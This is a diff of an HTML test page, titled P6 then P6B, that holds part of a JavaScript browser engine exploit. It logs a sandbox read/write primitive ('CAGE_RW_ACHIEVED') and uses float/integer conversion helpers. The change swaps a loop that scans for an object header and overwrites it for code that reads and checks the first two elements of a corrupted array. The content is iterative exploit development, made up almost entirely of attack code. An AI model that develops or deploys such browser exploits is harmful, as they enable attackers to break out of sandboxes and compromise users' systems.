@@ -1,5 +1,5 @@
 <!doctype html>
-<html><head><meta charset="utf-8"><title>P6</title></head>
+<html><head><meta charset="utf-8"><title>P6B</title></head>
 <body><pre id="out">Running...</pre>
 <script>
 "use strict";
@@ -109,15 +109,12 @@ try{
 
     log("WASM_RESULT: "+wasmInst.exports.f());
     log("CAGE_RW_ACHIEVED");
-    // Find header and redirect
-    const tgt=0x7fdffffe01100011n;
-    let hx=-1;
-    for(let k=0x7FFE;k<=0x8001;k++){try{if(f2i(master[k])===tgt){hx=k;break;}}catch(e){break;}}
-    if(hx>=0){
-      log("HDR@"+hx.toString(16));
-      master[hx]=i2f(0x7fdffffe01100011n); // keep same (0x1100011) - just verify it works
-      log("RD: "+f2i(master[0]).toString(16));
-    }
+    // Check m[0] and m[1] for header pattern
+    const r0=f2i(master[0]).toString(16);
+    const r1=f2i(master[1]).toString(16);
+    log("R0:"+r0+" R1:"+r1);
+    if(r0==="7fdffffe01100011"){log("HDR_AT_0");}
+    if(r1==="7fdffffe01100011"){log("HDR_AT_1");}
   }else if(mt==="object"){
     log("OBJ_NOT_ARRAY");
     try{log("KEYS: "+Object.keys(master).length);}catch(e){}
